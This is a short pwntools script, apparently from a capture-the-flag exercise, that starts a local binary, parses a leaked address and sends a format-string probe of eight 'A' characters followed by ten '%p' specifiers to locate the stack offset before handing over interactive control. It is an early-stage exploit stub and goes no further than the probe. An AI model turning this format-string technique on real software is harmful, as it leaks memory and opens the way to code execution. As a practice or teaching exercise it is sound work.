from pwn import *

r = process(r'./pwn')
elf = ELF(r'./pwn')
context.log_level = 'debug'

r.recvuntil(b'addr: ')
s_addr = int(r.recvuntil(b'\n', drop=True), 16)
print(f"s_addr: {hex(s_addr)}")

offset_payload = b'A' * 8 + b'.%p' * 10
r.sendlineafter(b'message: ', offset_payload)
r.interactive()